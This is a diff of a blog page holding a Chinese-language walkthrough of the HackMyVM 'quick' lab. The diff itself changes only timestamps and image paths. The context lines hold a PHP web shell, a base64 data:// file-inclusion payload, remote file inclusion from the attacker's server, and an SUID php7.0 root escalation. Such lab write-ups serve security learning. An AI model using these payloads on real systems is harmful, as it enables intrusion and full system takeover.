@@ -29,7 +29,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://cmacckk.github.io/avatar.jpg">
 <meta property="article:published_time" content="2025-06-11T00:00:00.000Z">
-<meta property="article:modified_time" content="2025-07-09T08:13:04.921Z">
+<meta property="article:modified_time" content="2025-07-09T08:16:55.347Z">
 <meta property="article:author" content="CMACCKK">
 <meta property="article:tag" content="data伪协议">
 <meta property="article:tag" content="远程文件包含">
@@ -51,7 +51,7 @@
 
   
 
-  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"CMACCKK","sameAs":[],"image":"https://cmacckk.github.io/avatar.jpg"},"dateCreated":"2025-06-11T00:00:00Z","dateModified":"2025-07-09T08:13:04Z","datePublished":"2025-06-11T00:00:00Z","description":"","headline":"quick","mainEntityOfPage":{"@type":"WebPage","@id":"https://cmacckk.github.io/2025/06/11/quick/"},"publisher":{"@type":"Organization","name":"CMACCKK","sameAs":[],"image":"https://cmacckk.github.io/avatar.jpg","logo":{"@type":"ImageObject","url":"https://cmacckk.github.io/avatar.jpg"}},"url":"https://cmacckk.github.io/2025/06/11/quick/","keywords":"data伪协议, 远程文件包含, php提权","thumbnailUrl":"./img/cover.png","image":1}</script>
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"CMACCKK","sameAs":[],"image":"https://cmacckk.github.io/avatar.jpg"},"dateCreated":"2025-06-11T00:00:00Z","dateModified":"2025-07-09T08:16:55Z","datePublished":"2025-06-11T00:00:00Z","description":"","headline":"quick","mainEntityOfPage":{"@type":"WebPage","@id":"https://cmacckk.github.io/2025/06/11/quick/"},"publisher":{"@type":"Organization","name":"CMACCKK","sameAs":[],"image":"https://cmacckk.github.io/avatar.jpg","logo":{"@type":"ImageObject","url":"https://cmacckk.github.io/avatar.jpg"}},"url":"https://cmacckk.github.io/2025/06/11/quick/","keywords":"data伪协议, 远程文件包含, php提权","thumbnailUrl":"./img/quick/cover.png","image":1}</script>
   
 </head>
 <body>
@@ -83,7 +83,7 @@
   <div class="content">
     <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
 <span class="sep"></span><a class="cap breadcrumb" id="menu" href="/topic/">专栏</a><span class="sep"></span><a class="cap breadcrumb" id="proj" href="/2025/06/11/quick/">hackmyvm</a></div>
-<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2025-06-11T00:00:00.000Z">2025-06-11</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2025-07-09T08:13:04.921Z">2025-07-09</time></span></div></div></div>
+<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2025-06-11T00:00:00.000Z">2025-06-11</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2025-07-09T08:16:55.347Z">2025-07-09</time></span></div></div></div>
     
     <div class="bottom only-title">
       
@@ -95,17 +95,17 @@
     
   </div>
   </div><article class="md-text content"><p>使用<code>fscan</code>扫描发现开启了<code>80</code>端口，访问页面</p>
-<p><img src="/./img/quick-1.png"></p>
+<p><img src="/./img/quick/quick-1.png"></p>
 <p>点击下面的<code>Home</code>、<code>Cars</code>等会出现参数<code>?page=xxxx</code>，猜测有文件包含，但是使用<code>php</code>伪协议没有包含成功，尝试远程包含，本机开启服务器</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;test&quot;</span> &gt; 1.php</span><br><span class="line">python -m http.server 8089</span><br></pre></td></tr></table></figure>
 
-<p><img src="/./img/quick-2.png"></p>
+<p><img src="/./img/quick/quick-2.png"></p>
 <p>发现成功访问了我的<code>http</code>服务器上的<code>1.php</code></p>
 <h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h4 id="data-伪协议"><a href="#data-伪协议" class="headerlink" title="data:&#x2F;&#x2F;伪协议"></a>data:&#x2F;&#x2F;伪协议</h4><p>可以直接传数据，不用包含远程服务器上的文件</p>
 <p><code>&lt;?php system($_POST[1]);?&gt;</code></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfUE9TVFsxXSk7Pz4=</span><br></pre></td></tr></table></figure>
 
-<p><img src="/./img/quick-3.png"></p>
+<p><img src="/./img/quick/quick-3.png"></p>
 <h4 id="远程文件包含法"><a href="#远程文件包含法" class="headerlink" title="远程文件包含法"></a>远程文件包含法</h4><p>在攻击机启动一个<code>http</code>服务器</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server 8089</span><br></pre></td></tr></table></figure>
 
@@ -113,19 +113,19 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>因为这里代码应该是<code>$filename . &quot;.php&quot;</code>的类型，要过滤后面的<code>.php</code>可以在后面使用<code>?</code>和<code>#</code></p>
-<p><img src="/./img/quick-4.png"></p>
+<p><img src="/./img/quick/quick-4.png"></p>
 <p>使用配置</p>
-<p><img src="/./img/quick-5.png"></p>
+<p><img src="/./img/quick/quick-5.png"></p>
 <h3 id="php提权"><a href="#php提权" class="headerlink" title="php提权"></a>php提权</h3><p>尝试<code>suid</code>提权</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -4000 -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
 
-<p><img src="/./img/quick-6.png">发现<code>php7.0</code>具有<code>suid</code>权限,但是在蚁剑终端里面不能提权，反弹<code>shell</code>出来</p>
-<p><img src="/./img/quick-7.png"></p>
+<p><img src="/./img/quick/quick-6.png">发现<code>php7.0</code>具有<code>suid</code>权限,但是在蚁剑终端里面不能提权，反弹<code>shell</code>出来</p>
+<p><img src="/./img/quick/quick-7.png"></p>
 <p>然后使用命令</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/bin</span><br><span class="line">CMD=&quot;/bin/sh&quot;</span><br><span class="line">./php7.0 -r &quot;pcntl_exec(&#x27;/bin/sh&#x27;, [&#x27;-p&#x27;]);&quot;</span><br></pre></td></tr></table></figure>
 
-<p><img src="/./img/quick-8.png"></p>
-<p><img src="/./img/quick-9.png"></p>
+<p><img src="/./img/quick/quick-8.png"></p>
+<p><img src="/./img/quick/quick-9.png"></p>
 </article>
 <div class="article-footer">
     <section id="license">
